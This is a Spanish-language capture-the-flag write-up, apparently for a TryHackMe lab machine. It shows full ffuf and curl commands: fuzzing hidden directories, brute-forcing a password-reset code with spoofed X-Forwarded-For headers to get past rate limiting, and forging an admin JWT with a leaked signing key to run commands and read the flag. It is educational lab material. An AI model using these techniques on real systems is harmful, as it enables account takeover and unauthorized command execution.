# Conectividad

![image](https://github.com/user-attachments/assets/92b3491d-540e-454a-bdad-79c80066db47)

# Enumeración

Parece que nos estamos enfrentando a una máquina Linux ttl=64

Con una escáner de purtos básicos encontramos solo el puerto 22 abierto, si luego hacemos con el parametro -p-:

```
sudo nmap -sCV -T4 -p- --min-rate 4000 10.10.179.183
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-30 07:52 GMT
Nmap scan report for 10.10.179.183
Host is up (0.00029s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
MAC Address: 02:7F:13:6C:17:99 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.58 seconds
```

![image](https://github.com/user-attachments/assets/45d04405-1de6-4810-b409-1114d5389c8d)

Parece ser que nos encontramos con un login a ver si podemos enumerar y encontrar algun vector para saltear o enumerar

- Primero de todo he pensado en enumerar correos electronicos a base de "forgot your password" pero no es factible
- Por otra parte enumerar direcotrios, si nos fijamos en el código fuente encontramos que si enumeramos tal deberemos empezar por _hmr con lo cuál con ffuf vamos a hacerlo

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.179.183:1337/hmr_FUZZ
```

- css
- js
- logs
- images

Vamos a ir enumerando a ver si encontramos algo interesante

![image](https://github.com/user-attachments/assets/b74048bd-aa98-453a-bf0b-83435fcb5c94)

![image](https://github.com/user-attachments/assets/40bac6ae-1cce-41f6-8a34-b4c94b01d636)

Parece ser que en los logs encontramos info intersenate como un usuario = tester:Mismatch

tester@hammer.thm 

Mismatch

![image](https://github.com/user-attachments/assets/c6538d2a-29ac-4328-ba76-cb846367e466)

Vamos a ver si nos conectamos a la web, porque por ssh ya os digo que no va otra cosa que apuntar /restricted-area

# Explotación

Parece ser que vamos a tener que bypassear el reseteo de password vamos a ello

![image](https://github.com/user-attachments/assets/a1cc77f4-527d-4107-8863-151df06b83ad)

Podríamos intentar bypassear a base de fuerza bruta pero nos va a bloquear cada 5 intentos con lo cuál no es razonable

https://book.hacktricks.wiki/pentesting-web/rate-limit-bypass.html

Esto se hizo haciendo uso del encabezado X-Forwarded-For en la solicitud.

Ahora tenemos que prepararnos para realizar el ataque de fuerza bruta. Sabemos que el código estará entre 0000 y 9999, por lo que necesitamos crear un archivo con todos esos valores para introducirlos en ffuf. Usé bash para hacerlo;

```
printf "%04d\n" {0..9999} > count-9999.txt
```

También tendremos que obtener el PHPSESSID, pero lo conseguiremos justo antes del ataque. En otros Write Ups también falsifican la IP pero no se si eso será necesario (lo tenemos que hacer)

```
for X in {0..255}; do for Y in {0..255}; do echo "192.168.$X.$Y"; done; done > fake_ip.txt
```

No necesitamos tantas Ips vamos a rebajarlas

```
head -n 1000 fake_ip.txt > fake_ip_cut.txt
```

Ataque:

```
ffuf -w count-9999.txt:W1 -w fake_ip_cut.txt:W2 -u "http://<target_IP>:1337/reset_password.php" -X "POST" -d "recovery_code=W1&s=80" -b "PHPSESSID=<SESSIONID>" -H "X-Forwarded-For: W2" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -mode pitchfork -fw 1 -rate 100 -o output.txt
```

![image](https://github.com/user-attachments/assets/fd29a0ca-1cb5-423f-90aa-ea875ee8d389)

Después de encontrar el código simplemente nos metemos y cambiamos la pass

![image](https://github.com/user-attachments/assets/8a352cd3-3a6a-45e5-9cbc-64e14969c55b)

Estamos dentro, pero si estamos un poco de rato 10 segundos nos echa, con lo cuál vamos a ver que podemos ahcer

Parece que tenemos acceso a lcomando ls

![image](https://github.com/user-attachments/assets/3d5870b2-5cf1-452f-840a-5116215ab843)

Sabemos que esos directorios nos podemos meter y podemos ir enumerando el que mas me llama la atención creo y a todo el mundo es el .key

![image](https://github.com/user-attachments/assets/14e2f44f-583b-4c50-8351-e4de081cc1bc)

![image](https://github.com/user-attachments/assets/13c09770-8299-4f14-98f9-5844cc32aee1)

Si lo copiamos como Curl sacamos una nueva header que es la de Autorization

```
curl 'http://10.10.179.183:1337/execute_command.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM4MjI2NzAyLCJleHAiOjE3MzgyMzAzMDIsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.K_qG8POsXKe7ETEhEHQqRS1_dt3hAlJVcDBCh2BFyQY' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://10.10.179.183:1337' -H 'Connection: keep-alive' -H 'Referer: http://10.10.179.183:1337/dashboard.php' -H 'Cookie: PHPSESSID=litc887cilo0aed8e3t0g8rbge; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM4MjI2NzAyLCJleHAiOjE3MzgyMzAzMDIsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.K_qG8POsXKe7ETEhEHQqRS1_dt3hAlJVcDBCh2BFyQY; persistentSession=no' -H 'Priority: u=0' --data-raw '{"command":"ls"}'
```

Esto lo estudiamos anteriormente que son los jwtokens

https://jwt.io

![image](https://github.com/user-attachments/assets/0fc4f4d6-883b-4c2b-b894-5a150afb86cf)

# Escalada Privilegios

Una vez tenemos el token lo vamos a manipular para escalar privilegios y tener acceso a todos los comandos o funciones que necesitemos

Deberemos cambiar porsupuesto la key a la que va referida que es el directorio anterior que la hemos decsargado, utilizarla como codificador dicha key y cambiar el rol a admin

![image](https://github.com/user-attachments/assets/5c52edb7-c8a0-4490-a332-5708b8a7f94e)

Una vez tengamos todo cambiaremos el jwtoken del curl anterior y lo sustituiremos, también deberemos sustituir el comando para leer la flag o hacer alguna función específica

Así me ha quedado a mí:

```
curl 'http://10.10.179.183:1337/execute_command.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM4MjI2NzAyLCJleHAiOjE3MzgyMzAzMDIsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.eB9Seg7yWy-Ec2RhNZSI52W4nvX_3K8e8peKwocbPqs' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://10.10.179.183:1337' -H 'Connection: keep-alive' -H 'Referer: http://10.10.179.183:1337/dashboard.php' -H 'Cookie: PHPSESSID=litc887cilo0aed8e3t0g8rbge; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM4MjI2NzAyLCJleHAiOjE3MzgyMzAzMDIsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.K_qG8POsXKe7ETEhEHQqRS1_dt3hAlJVcDBCh2BFyQY; persistentSession=no' -H 'Priority: u=0' --data-raw '{"command":"cat /home/ubuntu/flag.txt"}'
{"output":"THM{RUNANYCOMMAND1337}\n"}
```

GG!! He aprendido mucho con esta CTf ya que yo no tenía tantos conocimientos de web.
